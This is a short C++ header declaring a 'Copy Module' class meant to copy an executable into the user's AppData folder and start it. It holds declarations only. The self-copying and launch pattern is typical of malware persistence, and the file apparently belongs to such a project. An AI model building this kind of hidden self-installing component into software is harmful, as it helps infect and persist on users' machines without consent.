using namespace std;
#pragma once
#include "pch.h"
#include "UTIL.h"
#include <string>
#include <Lmcons.h>

/**
	Copy Module:
	Responsible for copying executable to user AppData
**/
class CP {
	STARTUPINFO info = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };

	UTIL util;

public:
	void copy();
	void start();
	void execute();
};